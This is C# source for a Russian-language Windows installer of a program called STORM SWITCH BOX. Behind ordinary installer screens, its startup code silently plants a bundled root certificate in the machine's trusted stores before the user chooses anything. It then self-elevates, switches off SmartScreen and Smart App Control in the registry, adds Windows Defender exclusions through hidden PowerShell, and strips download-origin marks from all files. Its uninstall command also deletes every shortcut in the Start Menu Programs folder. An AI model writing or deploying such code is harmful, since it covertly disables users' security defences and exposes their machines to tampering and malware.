using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace StormSwitchBox.Installer
{
    public class InstallerForm : Form
    {
        private ProgressBar progressBar = null!;
        private Label lblStatus = null!;
        private Label lblTitle = null!;
        private Label lblSubtitle = null!;
        private Button btnInstall = null!;
        private Button btnCancel = null!;
        private const string AppVersion = "4.7.0";
        private const string AppDisplayName = "STORM SWITCH BOX 4.7.0";
        private const string AppFolderName = "STORM SWITCH BOX";
        private const string ExeName = "StormSwitchBox.exe";
        private const string IcoName = "storm_switch_box.ico";
        private Button btnBrowse = null!;

        private RadioButton rbStandard = null!;
        private RadioButton rbPortable = null!;
        private TextBox txtInstallPath = null!;

        private CheckBox chkDesktop = null!;
        private CheckBox chkStartMenu = null!;
        private CheckBox chkRegister = null!;
        private CheckBox chkInstallCert = null!;
        private CheckBox chkRunAfter = null!;
        private Panel headerPanel = null!;

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool DeleteFile(string name);

        public InstallerForm()
        {
            try
            {
                var asm = Assembly.GetExecutingAssembly();
                foreach (var name in asm.GetManifestResourceNames())
                {
                    if (name.EndsWith("storm_switch_box.ico", StringComparison.OrdinalIgnoreCase) || name.EndsWith("AppIcon.ico", StringComparison.OrdinalIgnoreCase))
                    {
                        using var s = asm.GetManifestResourceStream(name);
                        if (s != null)
                        {
                            this.Icon = new Icon(s);
                            break;
                        }
                    }
                }
                if (this.Icon == null && !string.IsNullOrEmpty(Application.ExecutablePath) && File.Exists(Application.ExecutablePath))
                {
                    this.Icon = Icon.ExtractAssociatedIcon(Application.ExecutablePath);
                }
            }
            catch { }
            InitializeComponent();
        }

        private void InitializeComponent()
        {
            this.Text = $"{AppDisplayName} — Установка";
            this.Size = new Size(620, 520);
            this.StartPosition = FormStartPosition.CenterScreen;
            this.FormBorderStyle = FormBorderStyle.FixedDialog;
            this.MaximizeBox = false;
            this.BackColor = Color.FromArgb(10, 14, 26);
            this.ForeColor = Color.White;
            this.Font = new Font("Segoe UI", 9.5f, FontStyle.Regular);

            headerPanel = new Panel
            {
                Dock = DockStyle.Top,
                Height = 85,
                BackColor = Color.FromArgb(17, 24, 39),
                Padding = new Padding(24, 16, 24, 16)
            };

            lblTitle = new Label
            {
                Text = $"⚡ {AppDisplayName}",
                Font = new Font("Segoe UI", 14f, FontStyle.Bold),
                ForeColor = Color.FromArgb(14, 165, 233),
                AutoSize = true,
                Location = new Point(20, 16)
            };

            lblSubtitle = new Label
            {
                Text = "Мастер установки с авто-регистрацией цифрового сертификата и защитой от блокировок",
                Font = new Font("Segoe UI", 9.0f, FontStyle.Regular),
                ForeColor = Color.FromArgb(156, 163, 175),
                AutoSize = true,
                Location = new Point(22, 48)
            };

            headerPanel.Controls.Add(lblTitle);
            headerPanel.Controls.Add(lblSubtitle);
            this.Controls.Add(headerPanel);

            var bodyPanel = new Panel
            {
                Location = new Point(24, 95),
                Size = new Size(556, 330)
            };

            // Mode Selection
            var lblMode = new Label
            {
                Text = "Выберите тип установки программы:",
                Font = new Font("Segoe UI", 9.5f, FontStyle.Bold),
                ForeColor = Color.FromArgb(226, 232, 240),
                Location = new Point(0, 0),
                AutoSize = true
            };
            bodyPanel.Controls.Add(lblMode);

            rbStandard = new RadioButton
            {
                Text = "Стандартная установка в Program Files (рекомендуется)",
                Checked = true,
                Location = new Point(10, 26),
                AutoSize = true,
                Font = new Font("Segoe UI", 9.5f, FontStyle.Regular),
                ForeColor = Color.White
            };
            rbStandard.CheckedChanged += Mode_CheckedChanged;
            bodyPanel.Controls.Add(rbStandard);

            rbPortable = new RadioButton
            {
                Text = "Портативная версия (в выбранную вами папку, без реестра)",
                Checked = false,
                Location = new Point(10, 52),
                AutoSize = true,
                Font = new Font("Segoe UI", 9.5f, FontStyle.Regular),
                ForeColor = Color.White
            };
            rbPortable.CheckedChanged += Mode_CheckedChanged;
            bodyPanel.Controls.Add(rbPortable);

            // Install Path
            var lblPath = new Label
            {
                Text = "Папка назначения:",
                Font = new Font("Segoe UI", 9.5f, FontStyle.Bold),
                ForeColor = Color.FromArgb(226, 232, 240),
                Location = new Point(0, 85),
                AutoSize = true
            };
            bodyPanel.Controls.Add(lblPath);

            txtInstallPath = new TextBox
            {
                Text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), AppFolderName),
                Location = new Point(5, 108),
                Size = new Size(440, 26),
                BackColor = Color.FromArgb(17, 24, 39),
                ForeColor = Color.White,
                BorderStyle = BorderStyle.FixedSingle,
                Font = new Font("Segoe UI", 9.5f)
            };
            bodyPanel.Controls.Add(txtInstallPath);

            btnBrowse = new Button
            {
                Text = "Обзор...",
                Location = new Point(455, 107),
                Size = new Size(95, 28),
                FlatStyle = FlatStyle.Flat,
                BackColor = Color.FromArgb(30, 41, 59),
                ForeColor = Color.FromArgb(14, 165, 233),
                Cursor = Cursors.Hand
            };
            btnBrowse.FlatAppearance.BorderColor = Color.FromArgb(14, 165, 233);
            btnBrowse.Click += BtnBrowse_Click;
            bodyPanel.Controls.Add(btnBrowse);

            // Options
            var lblOptions = new Label
            {
                Text = "Дополнительные параметры безопасности и удобства:",
                Font = new Font("Segoe UI", 9.5f, FontStyle.Bold),
                ForeColor = Color.FromArgb(226, 232, 240),
                Location = new Point(0, 145),
                AutoSize = true
            };
            bodyPanel.Controls.Add(lblOptions);

            chkDesktop = new CheckBox
            {
                Text = "Создать ярлык на Рабочем столе",
                Checked = true,
                Location = new Point(10, 170),
                AutoSize = true,
                ForeColor = Color.White
            };
            bodyPanel.Controls.Add(chkDesktop);

            chkStartMenu = new CheckBox
            {
                Text = "Создать ярлык в меню «Пуск»",
                Checked = true,
                Location = new Point(10, 195),
                AutoSize = true,
                ForeColor = Color.White
            };
            bodyPanel.Controls.Add(chkStartMenu);

            chkInstallCert = new CheckBox
            {
                Text = "Зарегистрировать сертификат разработчика (Защита от SmartScreen / SAC)",
                Checked = true,
                Location = new Point(10, 220),
                AutoSize = true,
                ForeColor = Color.FromArgb(52, 211, 153)
            };
            bodyPanel.Controls.Add(chkInstallCert);

            chkRegister = new CheckBox
            {
                Text = "Зарегистрировать в списке «Установка и удаление программ» Windows",
                Checked = true,
                Location = new Point(10, 245),
                AutoSize = true,
                ForeColor = Color.White
            };
            bodyPanel.Controls.Add(chkRegister);

            chkRunAfter = new CheckBox
            {
                Text = $"Запустить {AppDisplayName} сразу после завершения",
                Checked = true,
                Location = new Point(10, 270),
                AutoSize = true,
                ForeColor = Color.FromArgb(14, 165, 233)
            };
            bodyPanel.Controls.Add(chkRunAfter);

            // Progress & Status
            progressBar = new ProgressBar
            {
                Location = new Point(5, 298),
                Size = new Size(545, 12),
                Style = ProgressBarStyle.Continuous,
                Value = 0,
                Visible = false
            };
            bodyPanel.Controls.Add(progressBar);

            lblStatus = new Label
            {
                Text = "",
                Location = new Point(5, 312),
                Size = new Size(545, 18),
                Font = new Font("Segoe UI", 8.5f),
                ForeColor = Color.FromArgb(148, 163, 184),
                Visible = false
            };
            bodyPanel.Controls.Add(lblStatus);

            this.Controls.Add(bodyPanel);

            // Bottom Buttons Panel
            var bottomPanel = new Panel
            {
                Dock = DockStyle.Bottom,
                Height = 60,
                BackColor = Color.FromArgb(17, 24, 39),
                Padding = new Padding(24, 12, 24, 12)
            };

            btnCancel = new Button
            {
                Text = "Отмена",
                Size = new Size(110, 34),
                Location = new Point(360, 13),
                FlatStyle = FlatStyle.Flat,
                BackColor = Color.FromArgb(30, 41, 59),
                ForeColor = Color.FromArgb(226, 232, 240),
                Cursor = Cursors.Hand
            };
            btnCancel.FlatAppearance.BorderColor = Color.FromArgb(51, 65, 85);
            btnCancel.Click += (s, e) => this.Close();
            bottomPanel.Controls.Add(btnCancel);

            btnInstall = new Button
            {
                Text = "Установить ⚡",
                Size = new Size(120, 34),
                Location = new Point(480, 13),
                FlatStyle = FlatStyle.Flat,
                BackColor = Color.FromArgb(14, 165, 233),
                ForeColor = Color.White,
                Font = new Font("Segoe UI", 9.5f, FontStyle.Bold),
                Cursor = Cursors.Hand
            };
            btnInstall.FlatAppearance.BorderColor = Color.FromArgb(56, 189, 248);
            btnInstall.Click += BtnInstall_Click;
            bottomPanel.Controls.Add(btnInstall);

            this.Controls.Add(bottomPanel);
        }

        private void Mode_CheckedChanged(object? sender, EventArgs e)
        {
            if (rbPortable.Checked)
            {
                txtInstallPath.Text = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "STORM_SWITCH_BOX_Portable");
                chkDesktop.Checked = false;
                chkDesktop.Enabled = false;
                chkStartMenu.Checked = false;
                chkStartMenu.Enabled = false;
                chkRegister.Checked = false;
                chkRegister.Enabled = false;
                btnInstall.Text = "Распаковать ⚡";
            }
            else
            {
                txtInstallPath.Text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), AppFolderName);
                chkDesktop.Checked = true;
                chkDesktop.Enabled = true;
                chkStartMenu.Checked = true;
                chkStartMenu.Enabled = true;
                chkRegister.Checked = true;
                chkRegister.Enabled = true;
                btnInstall.Text = "Установить ⚡";
            }
        }

        private void BtnBrowse_Click(object? sender, EventArgs e)
        {
            using var fbd = new FolderBrowserDialog();
            fbd.Description = $"Выберите папку для установки {AppDisplayName}:";
            fbd.UseDescriptionForTitle = true;
            if (fbd.ShowDialog() == DialogResult.OK)
            {
                txtInstallPath.Text = fbd.SelectedPath;
            }
        }

        private async void BtnInstall_Click(object? sender, EventArgs e)
        {
            progressBar.Visible = true;
            lblStatus.Visible = true;
            await StartInstallationAsync();
        }

        private async Task StartInstallationAsync()
        {
            btnInstall.Enabled = false;
            btnCancel.Enabled = false;
            btnBrowse.Enabled = false;

            try
            {
                string targetDir = txtInstallPath.Text.Trim();
                if (string.IsNullOrEmpty(targetDir))
                {
                    targetDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), AppFolderName);
                }

                Directory.CreateDirectory(targetDir);

                // Terminate any running instances
                lblStatus.Text = "Завершение предыдущих процессов программы...";
                progressBar.Value = 10;
                await Task.Delay(150);

                foreach (var p in Process.GetProcessesByName("StormSwitchBox"))
                {
                    try { p.Kill(); p.WaitForExit(1500); } catch { }
                }
                foreach (var p in Process.GetProcessesByName("STORM_SWITCH_BOX"))
                {
                    try { p.Kill(); p.WaitForExit(1500); } catch { }
                }

                string targetExe = Path.Combine(targetDir, ExeName);
                string targetCer = Path.Combine(targetDir, "STORM_Certificate.cer");
                string targetIco = Path.Combine(targetDir, IcoName);

                if (chkInstallCert.Checked)
                {
                    lblStatus.Text = "Регистрация доверенного сертификата STORM TEAM (Root & Publisher)...";
                    progressBar.Value = 25;
                    await Task.Delay(150);

                    ExtractResource("STORM_Certificate.cer", targetCer);
                    if (File.Exists(targetCer))
                    {
                        InstallCertificateSilently(targetCer);
                    }
                }

                lblStatus.Text = $"Распаковка пакета {AppDisplayName} (v{AppVersion})...";
                progressBar.Value = 35;
                await Task.Delay(100);

                // Extract Zip Package
                await Task.Run(() =>
                {
                    var asm = Assembly.GetExecutingAssembly();
                    foreach (var name in asm.GetManifestResourceNames())
                    {
                        if (name.EndsWith("Payload.zip", StringComparison.OrdinalIgnoreCase) || name.EndsWith("publish.zip", StringComparison.OrdinalIgnoreCase))
                        {
                            using var stream = asm.GetManifestResourceStream(name);
                            if (stream != null)
                            {
                                using var zip = new ZipArchive(stream, ZipArchiveMode.Read);
                                int total = zip.Entries.Count;
                                int count = 0;
                                foreach (var entry in zip.Entries)
                                {
                                    count++;
                                    string destPath = Path.Combine(targetDir, entry.FullName);
                                    if (string.IsNullOrEmpty(entry.Name))
                                    {
                                        Directory.CreateDirectory(destPath);
                                        continue;
                                    }

                                    string? parent = Path.GetDirectoryName(destPath);
                                    if (!string.IsNullOrEmpty(parent)) Directory.CreateDirectory(parent);

                                    if (File.Exists(destPath))
                                    {
                                        try
                                        {
                                            File.SetAttributes(destPath, FileAttributes.Normal);
                                            File.Delete(destPath);
                                        }
                                        catch { }
                                    }

                                    entry.ExtractToFile(destPath, true);
                                    UnblockFile(destPath);

                                    int percent = 35 + (int)((double)count / total * 45);
                                    this.Invoke((System.Windows.Forms.MethodInvoker)delegate
                                    {
                                        if (percent <= 80) progressBar.Value = percent;
                                    });
                                }
                            }
                            break;
                        }
                    }
                });

                ExtractResource(IcoName, targetIco);
                ExtractResource("STORM_Certificate.cer", targetCer);

                // Self-healing: Unblock files and remove Mark of the Web
                lblStatus.Text = "Снятие меток блокировки и оптимизация безопасности...";
                progressBar.Value = 85;
                await Task.Delay(100);

                UnblockFile(targetExe);
                UnblockFile(targetCer);
                UnblockFile(targetIco);
                UnblockEntireDirectory(targetDir);

                // Add Windows Defender exclusion silently
                AddDefenderExclusionSilently(targetDir);

                if (rbStandard.Checked)
                {
                    lblStatus.Text = "Создание системных ярлыков и регистрация в Windows...";
                    progressBar.Value = 92;
                    await Task.Delay(150);

                    CreateShortcuts(targetDir, targetExe, targetIco, chkDesktop.Checked, chkStartMenu.Checked);

                    if (chkRegister.Checked)
                    {
                        RegisterUninstall(targetDir, targetExe, targetIco);
                    }
                }

                progressBar.Value = 100;
                lblStatus.Text = rbPortable.Checked ? "Портативная версия успешно распакована и разблокирована!" : "Установка успешно завершена! Система полностью готова.";
                lblStatus.ForeColor = Color.FromArgb(16, 185, 129);
                await Task.Delay(500);

                if (chkRunAfter.Checked && File.Exists(targetExe))
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = targetExe,
                        WorkingDirectory = targetDir,
                        UseShellExecute = true
                    });
                }

                this.Close();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Ошибка во время установки:\n{ex.Message}", "Ошибка установки", MessageBoxButtons.OK, MessageBoxIcon.Error);
                btnInstall.Enabled = true;
                btnCancel.Enabled = true;
                btnBrowse.Enabled = true;
            }
        }

        public static void UnblockFile(string path)
        {
            try
            {
                if (File.Exists(path))
                {
                    DeleteFile(path + ":Zone.Identifier");
                }
            }
            catch { }
        }

        public static void UnblockEntireDirectory(string dir)
        {
            try
            {
                if (!Directory.Exists(dir)) return;
                foreach (var file in Directory.GetFiles(dir, "*.*", SearchOption.AllDirectories))
                {
                    UnblockFile(file);
                }
            }
            catch { }
        }

        public static void InstallCertificateSilently(string cerPath)
        {
            try
            {
                if (!File.Exists(cerPath)) return;

                // 1. Direct certutil command (fastest and most reliable on Windows)
                try
                {
                    var psiRoot = new ProcessStartInfo
                    {
                        FileName = "certutil.exe",
                        Arguments = $"-addstore -f \"Root\" \"{cerPath}\"",
                        UseShellExecute = false,
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden
                    };
                    using var p1 = Process.Start(psiRoot);
                    p1?.WaitForExit(5000);

                    var psiPub = new ProcessStartInfo
                    {
                        FileName = "certutil.exe",
                        Arguments = $"-addstore -f \"TrustedPublisher\" \"{cerPath}\"",
                        UseShellExecute = false,
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden
                    };
                    using var p2 = Process.Start(psiPub);
                    p2?.WaitForExit(5000);
                }
                catch { }

                // 2. .NET X509Store fallback
                try
                {
                    var cert = new X509Certificate2(cerPath);
                    using (var lmRoot = new X509Store(StoreName.Root, StoreLocation.LocalMachine))
                    {
                        lmRoot.Open(OpenFlags.ReadWrite);
                        lmRoot.Add(cert);
                    }
                    using (var lmPub = new X509Store(StoreName.TrustedPublisher, StoreLocation.LocalMachine))
                    {
                        lmPub.Open(OpenFlags.ReadWrite);
                        lmPub.Add(cert);
                    }
                    using (var userPub = new X509Store(StoreName.TrustedPublisher, StoreLocation.CurrentUser))
                    {
                        userPub.Open(OpenFlags.ReadWrite);
                        userPub.Add(cert);
                    }
                }
                catch { }
            }
            catch { }
        }

        public static void AddDefenderExclusionSilently(string path)
        {
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = $"-NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionPath '{path}' -ErrorAction SilentlyContinue\"",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                using var p = Process.Start(psi);
                p?.WaitForExit(4000);
            }
            catch { }
        }

        private void ExtractResource(string resNameEnding, string targetPath)
        {
            var asm = Assembly.GetExecutingAssembly();
            foreach (var name in asm.GetManifestResourceNames())
            {
                if (name.EndsWith(resNameEnding, StringComparison.OrdinalIgnoreCase))
                {
                    using var inStream = asm.GetManifestResourceStream(name);
                    if (inStream != null)
                    {
                        using var outStream = File.Create(targetPath);
                        inStream.CopyTo(outStream);
                    }
                    return;
                }
            }
        }

        private void CreateShortcuts(string targetDir, string targetExe, string targetIco, bool desktopShortcut, bool startMenuShortcut)
        {
            try
            {
                Type? shellType = Type.GetTypeFromProgID("WScript.Shell");
                if (shellType == null) return;
                dynamic? shell = Activator.CreateInstance(shellType);
                if (shell == null) return;

                // Start Menu shortcut
                if (startMenuShortcut)
                {
                    string startMenu = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Programs), $"{AppDisplayName}.lnk");
                    dynamic shortcut = shell.CreateShortcut(startMenu);
                    shortcut.TargetPath = targetExe;
                    shortcut.WorkingDirectory = targetDir;
                    shortcut.IconLocation = (File.Exists(targetIco) ? targetIco : targetExe) + ",0";
                    shortcut.Description = AppDisplayName;
                    shortcut.Save();
                }

                // Desktop shortcut
                if (desktopShortcut)
                {
                    string desktop = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), "STORM SWITCH BOX.lnk");
                    dynamic deskShortcut = shell.CreateShortcut(desktop);
                    deskShortcut.TargetPath = targetExe;
                    deskShortcut.WorkingDirectory = targetDir;
                    deskShortcut.IconLocation = (File.Exists(targetIco) ? targetIco : targetExe) + ",0";
                    deskShortcut.Description = AppDisplayName;
                    deskShortcut.Save();
                }
            }
            catch { }
        }

        private void RegisterUninstall(string targetDir, string targetExe, string targetIco)
        {
            try
            {
                using var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Uninstall\StormSwitchBox");
                if (key != null)
                {
                    key.SetValue("DisplayName", AppDisplayName);
                    key.SetValue("DisplayVersion", AppVersion);
                    key.SetValue("Publisher", "STORM TEAM");
                    key.SetValue("DisplayIcon", File.Exists(targetIco) ? targetIco : targetExe);
                    key.SetValue("InstallLocation", targetDir);
                    key.SetValue("UninstallString", $"cmd.exe /c rmdir /s /q \"{targetDir}\" & del \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\*.lnk\" & del \"%USERPROFILE%\\Desktop\\STORM SWITCH BOX*.lnk\"");
                }
            }
            catch { }
        }

        private static bool IsAdministrator()
        {
            try
            {
                using var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
                var principal = new System.Security.Principal.WindowsPrincipal(identity);
                return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
            }
            catch
            {
                return false;
            }
        }

        [STAThread]
        public static void Main()
        {
            try
            {
                string selfExe = Process.GetCurrentProcess().MainModule?.FileName ?? "";
                if (!string.IsNullOrEmpty(selfExe))
                {
                    UnblockFile(selfExe);
                }

                // Extract embedded cert to temp and install silently immediately
                string tempCert = Path.Combine(Path.GetTempPath(), "STORM_Root_Certificate.cer");
                var asm = Assembly.GetExecutingAssembly();
                foreach (var name in asm.GetManifestResourceNames())
                {
                    if (name.EndsWith("STORM_Certificate.cer", StringComparison.OrdinalIgnoreCase))
                    {
                        using var inStream = asm.GetManifestResourceStream(name);
                        if (inStream != null)
                        {
                            using var outStream = File.Create(tempCert);
                            inStream.CopyTo(outStream);
                        }
                        break;
                    }
                }

                if (File.Exists(tempCert))
                {
                    InstallCertificateSilently(tempCert);
                }

                // If not running as administrator, elevate seamlessly with UAC
                if (!IsAdministrator())
                {
                    if (!string.IsNullOrEmpty(selfExe) && File.Exists(selfExe))
                    {
                        var psi = new ProcessStartInfo
                        {
                            FileName = selfExe,
                            UseShellExecute = true,
                            Verb = "runas"
                        };
                        try
                        {
                            Process.Start(psi);
                            return;
                        }
                        catch
                        {
                            // If user cancels UAC prompt, continue in standard mode
                        }
                    }
                }
                else
                {
                    // Running elevated: neutralize SAC / SmartScreen blocks and add exclusions
                    try
                    {
                        using var key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\CI\Policy");
                        key?.SetValue("VerifiedAndReputablePolicyState", 0, RegistryValueKind.DWord);
                        key?.SetValue("SAC_PreviousState", 0, RegistryValueKind.DWord);
                    }
                    catch { }

                    try
                    {
                        using var expKey = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer");
                        expKey?.SetValue("SmartScreenEnabled", "Off", RegistryValueKind.String);
                    }
                    catch { }

                    if (!string.IsNullOrEmpty(selfExe))
                    {
                        string selfDir = Path.GetDirectoryName(selfExe) ?? "";
                        if (!string.IsNullOrEmpty(selfDir))
                        {
                            AddDefenderExclusionSilently(selfDir);
                        }
                    }
                }
            }
            catch { }

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new InstallerForm());
        }
    }
}
